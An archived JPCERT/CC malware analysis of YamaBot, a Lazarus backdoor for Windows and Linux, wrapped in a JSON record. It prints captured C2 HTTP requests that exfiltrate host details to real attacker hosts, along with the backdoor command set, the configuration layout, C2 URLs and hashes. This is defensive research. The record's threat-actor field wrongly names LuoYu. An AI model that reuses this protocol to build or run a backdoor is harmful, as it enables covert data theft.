{
    "id": "ca9ae5b2-afbe-4a45-be34-42a03d7149c2",
    "created_at": "2023-01-12T15:02:42.829823Z",
    "updated_at": "2025-03-27T02:17:02.274645Z",
    "deleted_at": null,
    "sha1_hash": "adda84b267ba1645e45ee876c108157d18de9676",
    "title": "2022-07-07 - YamaBot Malware Used by Lazarus",
    "authors": "",
    "file_creation_date": "2022-10-02T12:02:11Z",
    "file_modification_date": "2022-10-02T12:02:11Z",
    "file_size": 532025,
    "plain_text": "# JPCERT Coordination Center official Blog\n\n**blogs.jpcert.or.jp/en/2022/07/yamabot.html**\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nJuly 7, 2022\n\n## YamaBot Malware Used by Lazarus\n\n[Lazarus](https://blogs.jpcert.or.jp/en/tags/lazarus/)\n\n[Email](mailto:?subject=YamaBot%20Malware%20Used%20by%20Lazarus&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2022%2F07%2Fyamabot.html)\n\nJPCERT/CC is continuously investigating the activities by Lazarus. In 2021, JPCERT/CC\npresented on its attack activities at CODE BLUE and HITCON.\n\n[https://github.com/JPCERTCC/Lazarus-research/](https://github.com/JPCERTCC/Lazarus-research/)\n\nThe YamaBot malware shared in the above research report targeted the Linux OS, but\nanother type recently found targets Windows OS. (It is referred to as Kaos in the document,\nbut this blog refers to it as YamaBot.) YamaBot is malware coded in Golang, with slightly\ndifferent functionality between types created for each platform. In addition to YamaBot,\nLazarus also created several other types of malware targeting multiple platforms, such as\n[VSingle. This article covers the details of YamaBot.](https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html)\n\n\n-----\n\n### Overview of YamaBot\n\nYamaBot malware communicates with C2 servers using HTTP requests. The following is a\nlist of function names included in the sample that targets Windows OS. It is the attacker that\nnamed the malware as Yamabot. Those targeting Windows OS have functions specific to it,\nsuch as creating and checking Mutex.\n```\n_/D_/Bot/YamaBot/utilities.BaseDecodeR\n\n_/D_/Bot/YamaBot/utilities.HttpPostWithCookie\n\n_/D_/Bot/YamaBot/utilities.HttpPostWithFile\n\n_/D_/Bot/YamaBot/utilities.GetMacAddress\n\n_/D_/Bot/YamaBot/utilities.GetHash\n\n_/D_/Bot/YamaBot/utilities.GetCookieParams\n\n_/D_/Bot/YamaBot/utilities.GetRndString\n\n_/D_/Bot/YamaBot/utilities.BmpMaker\n\n_/D_/Bot/YamaBot/utilities.createMutex\n\n_/D_/Bot/YamaBot/utilities.CCheckkmutex\n\n_/D_/Bot/YamaBot/utilities.CIpaddress\n\n_/D_/Bot/YamaBot/utilities.COsname\n\n_/D_/Bot/YamaBot/utilities.getOSVer\n\n_/D_/Bot/YamaBot/utilities.Run\n\n_/D_/Bot/YamaBot/utilities.Run.func1\n\n_/D_/Bot/YamaBot/utilities.Run.func2\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).Lunch\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).Init_Verbindung\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).Verschlusselte_Zeichenkette_Eerhalten\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).getInitBotInfo\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).getEggPrice\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).handleMarketPrice\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).processMarketPrice\n\n_/D_/Bot/YamaBot/engine.(*FileStruct).getSessionStr\n\n\n```\nThe following is a list of malware function names included in the sample targeting Linux OS.\nThe name kaos was used for it.\n\n\n-----\n\n```\n_/C_/Users/administrator/Downloads/kaos/utilities.BaseDecodeR\n\n_/C_/Users/administrator/Downloads/kaos/utilities.HttpPostWithCookie\n\n_/C_/Users/administrator/Downloads/kaos/utilities.BaseDecode\n\n_/C_/Users/administrator/Downloads/kaos/utilities.HttpPostWithFile\n\n_/C_/Users/administrator/Downloads/kaos/utilities.GenerateUniqueID\n\n_/C_/Users/administrator/Downloads/kaos/utilities.GetCookieParams\n\n_/C_/Users/administrator/Downloads/kaos/utilities.BaseEncode\n\n_/C_/Users/administrator/Downloads/kaos/utilities.GetRndString\n\n_/C_/Users/administrator/Downloads/kaos/utilities.EierKochen\n\n_/C_/Users/administrator/Downloads/kaos/utilities.CIpaddress\n\n_/C_/Users/administrator/Downloads/kaos/utilities.Run\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).Lunch\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).kandidatKaufhaus\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).initDuck\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).GetEncString\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).getInitEggPrice\n\n_/C_/Users/administrator/Downloads/kaos/utilities.COsname\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).getEggPrice\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).handleMarketPrice\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).processMarketPrice\n\n_/C_/Users/administrator/Downloads/kaos/engine.(*Egg).getSessionStr\n\n_/C_/Users/administrator/Downloads/kaos/engine.NewEgg\n\n```\nFigure 1 shows a part of the code to read configuration. The malware's configuration\nincludes RC4 keys. (See Appendix A for further information on the configuration). The\nconfiguration has no difference depending on OS.\n\n\n-----\n\nFigure 1: Code for reading configuration\nThe following sections describes YamaBot's communication methods and commands,\nfocusing on the differences between the Linux OS version and the Windows OS version.\n\n### Communication methods\n\nYamaBot communicates with the C2 server using HTTP requests. The following is the first\nHTTP POST request sent by YamaBot. Although it is a HTTP POST request, there is no data\nto send. It is also unique in that the UserAgent is Base64-encoded.\n```\nPOST /editor/session/aaa000/support.php HTTP/1.1\n\nHost: 213.180.180.154\n\nUser-Agent:\nTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSF\n\nConnection: close\n\nContent-Length: 0\n\nAccept-Encoding: gzip\n\n```\n\n-----\n\nAfter successfully connecting to the C2 server, YamaBot sends the following request, which\nincludes information in its cookie header. The `captcha_session contains a randomly`\ngenerated string and a RC4 key ([random characters (16 bytes)][RC4 key (16 bytes)][random\ncharacters (4 bytes)]), Base64-encoded. The RC4 key is the first 16 bytes of the MD5 value\ncreated from the following data.\n\nTarget Windows OS: hostname, username, MAC address\nTarget Linux OS: hostname, username\n\nThe `captcha_val contains device information and the results of command execution,`\nRC4-encrypted and Base64-encoded.\n```\nPOST /editor/session/aaa000/support.php HTTP/1.1\n\nHost: 213.180.180.154\n\nUser-Agent:\nTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSF\n\nConnection: close\n\nContent-Length: 0\n\nCookie: captcha_session=MTE5NzZmMTYwYzRlNTU4YjhhNDZhMTM4ZGMwNzgzNTNhNmUy;\ncaptcha_val=W%2BIePQNeokInrSpb%2Fw1rTLAZvJAZQHmqAm2rXWdTsCvZ\n\nAccept-Encoding: gzip\n\n\n```\nThe first data sent by `captcha_val is OS information and IP address. The following`\ncontents are sent.\n```\nwindows 6 amd64|[192.168.1.1]\n\nlinux 386|[192.168.1.1]\n\n\n```\nFurthermore, if the size of the data to be sent exceeds a certain size (check the examples of\n3,333 bytes and 7,000 bytes), it is sent disguised as multi-part BMP data instead of\n```\ncaptcha_val .\n\n```\n\n-----\n\n```\nPOST /recaptcha.php HTTP/1.1\n\nHost: www.karin-store.com\n\nUser-Agent:\nTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSF\n\nConnection: close\n\nContent-Length: [Length]\n\nContent-Type: multipart/form-data;\nboundary=f24fad327291ab32166b7aa751d1d945a35933ee5bd81618274cda6afeeb\n\nCookie: captcha_session=YTY5NDQ5MDYwNmRkNjIyOWI3MzU1NTNmYzMxMzhiNTAyNGJh;\ncaptcha_val=NGI5NjdhNTdhNjliZTVkMg%3D%3D\n\nAccept-Encoding: gzip\n\n--f24fad327291ab32166b7aa751d1d945a35933ee5bd81618274cda6afeeb\n\nContent-Disposition: form-data; name=\"recaptcha\"; filename=\"recaptcha.png\"\n\nContent-Type: application/octet-stream\n\nBMf6(....0a..DT043b01c728892b495b99ea4c257fe3a8fea3a5f\n\n--f24fad327291ab32166b7aa751d1d945a35933ee5bd81618274cda6afeeb-\n```\nThe commands from the server are included in the Set-Cookie header. They are RC4encrypted and Base64-encoded and then included in the `captcha_session as follows.`\nNote that the data sent by the malware is used as the RC4 key.\n```\nSet-Cookie: captcha_session=[Base64エンコードされた命令]\n\n\n### Command\n\n```\nThe malware executes certain commands sent from its C2 server, and they are largely\ndifferent depending on target OS. Those targeting Linux OS can only execute shell\ncommands by /bin/sh. On the other hand, those targeting Windows OS have multiple\ncommands implemented as follows.\n\ndir: Get the file list\nMapfs: Get the directory list\nDownload: Download file\nInfo: Send file path and PID\nSleep: Change sleep time\nUninstall: Delete itself\ni: Change interval time\nOthers: Execute a given string with shell command\n\nThe command is in the form of `[command][command parameters], and the first half`\nincludes the above command.\n\nWhen the command `i is executed, the execution result is sent including German language`\nas follows. The reason why German language is included in YamaBot is unknown.\n\n\n-----\n\nFigure 2: Data sent when executing i command\n\n### In closing\n\nYamaBot malware is still used by attackers. Since it targets not only Windows OS but also\nLinux OS, servers should also be carefully investigated during incident investigation.\nAttention should continuously paid as attacks by Lazarus have been confirmed in Japan.\nAnother type of malware used by Lazarus will be covered in the next issue.\n\nShusei Tomonaga\n\n(Translated by Takumi Nakano)\n\n**Appendix A: Configuration Information**\n\nTable A-2: List of configuration information (x86)\n\nOffset Description Notes\n\n0x000 interval communication interval\n\n0x004 - unused\n\n0x008 C2 server\n\n0x00C C2 server length\n\n0x010 RC4 key\n\n0x014 RC4key length\n\n0x018 C2 server connection C2 server connection successful/unsuccessful\n\n\n-----\n\n0x01C Cookie header value Value to set in cookie header\n\n0x020 - unused\n\n0x024 The number of connections The number of reconnections to C2 server\n\nTable A-1: List of configuration information (x64)\n\nOffset Description Notes\n\n0x000 interval communication interval\n\n0x008 C2 server\n\n0x010 C2 server length\n\n0x018 RC4 key\n\n0x020 RC4 key length\n\n0x028 C2 server connection C2 server connection successful/unsuccessful\n\n0x030 Cookie header value Value to set in cookie header\n\n0x038 - unused\n\n0x040 The number of connections The number of reconnections to C2 server\n\n**Appendix B: C2 server**\n\nhttp://www.karin-store.com/recaptcha.php\nhttp://yoshinorihirano.net/wp-includes/feed-xml.php\nhttp://213.180.180.154/editor/session/aaa000/support.php\n\n**Appendix C: Malware hash value**\n\nf226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb\n6db57bbc2d07343dd6ceba0f53c73756af78f09fe1cb5ce8e8008e5e7242eae1\n\n[Email](mailto:?subject=YamaBot%20Malware%20Used%20by%20Lazarus&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fen%2F2022%2F07%2Fyamabot.html)\n\nAuthor\n\n\n-----\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/en/shu_tom/)\n\nSince December 2012, he has been engaged in malware analysis and forensics\ninvestigation, and is especially involved in analyzing incidents of targeted attacks. Prior to\njoining JPCERT/CC, he was engaged in security monitoring and analysis operations at a\nforeign-affiliated IT vendor. He presented at CODE BLUE, BsidesLV, BlackHat USA Arsenal,\nBotconf, PacSec and FIRST Conference. JSAC organizer.\n\nWas this page helpful?\n\n0 people found this content helpful.\n\nIf you wish to make comments or ask questions, please use this form.\n\nThis form is for comments and inquiries. For any questions regarding specific commercial\nproducts, please contact the vendor.\n\nplease change the setting of your browser to set JavaScript valid.\nThank you!\n\n## Related articles\n\nVSingle malware that obtains C2 server information from GitHub\n\nAnalysis of HUI Loader\n\nAnti-UPX Unpacking Technique\n\n\n-----\n\nFAQ: Malware that Targets Mobile Devices and How to Protect Them\n\nMalware WinDealer used by LuoYu Attack Group\n\n\n[Back](https://blogs.jpcert.or.jp/en/2022/07/vsingle.html)\n[Top](https://blogs.jpcert.or.jp/en/)\n[Next](https://blogs.jpcert.or.jp/en/2022/08/rfc9116-introduction.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-07 - YamaBot Malware Used by Lazarus.pdf"
    ],
    "report_names": [
        "2022-07-07 - YamaBot Malware Used by Lazarus.pdf"
    ],
    "threat_actors": [
        {
            "id": "b72c2616-cc7c-4c47-a83d-6b7866b94746",
            "created_at": "2023-01-06T13:46:39.425297Z",
            "updated_at": "2025-03-27T02:00:03.08718Z",
            "deleted_at": null,
            "main_name": "Red Nue",
            "aliases": [
                "LuoYu"
            ],
            "source_name": "MISPGALAXY:Red Nue",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535762,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1664712131,
    "ts_modification_date": 1664712131,
    "files": {
        "pdf": "https://archive.orkl.eu/adda84b267ba1645e45ee876c108157d18de9676.pdf",
        "text": "https://archive.orkl.eu/adda84b267ba1645e45ee876c108157d18de9676.txt",
        "img": "https://archive.orkl.eu/adda84b267ba1645e45ee876c108157d18de9676.jpg"
    }
}